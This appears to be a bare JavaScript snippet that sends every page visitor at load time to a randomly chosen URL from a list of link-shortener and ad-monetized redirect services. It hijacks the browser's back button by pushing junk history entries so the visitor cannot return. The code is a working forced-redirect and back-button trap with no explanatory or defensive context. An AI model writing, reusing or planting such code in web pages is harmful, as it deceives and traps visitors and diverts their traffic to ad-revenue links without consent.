var urls = ["https://besargaji.com/5JOM4",
            "https://link.bicolink.net/RkEEOrTw",
            "https://arahlink.id/sSttqz",
            "https://ouo.io/qCY43Q",
            "https://adbull.me/6Zf4",
            "https://to.aoutoqw.xyz/zMkuA06G",
            "https://go.aoutoqw.xyz/SvdJ"
];

function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

